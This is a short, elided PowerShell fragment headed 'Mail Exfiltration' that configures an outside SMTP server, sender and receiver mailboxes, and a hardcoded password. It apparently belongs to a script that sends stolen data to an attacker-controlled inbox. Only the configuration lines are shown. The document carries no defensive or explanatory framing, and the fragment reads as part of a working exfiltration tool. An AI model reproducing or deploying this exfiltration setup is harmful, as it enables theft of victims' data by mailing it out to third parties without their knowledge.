...
#Mail Exfiltration
$smtp = "smtp.protonmail.ch" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
$From = "SandstormA1@proton.me" # Put the SENDER HERE
$To = "BonesawA2@proton.me" # Put the RECEIVER HERE
$smtp = "smtp.protonmail.ch" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
...
$Password = "OUISADT/)(A6dsta7zsgDJUHdgsAJHDgouaGSDaDSZ&s08AUh" | ConvertTo-SecureString -AsPlainText -Force
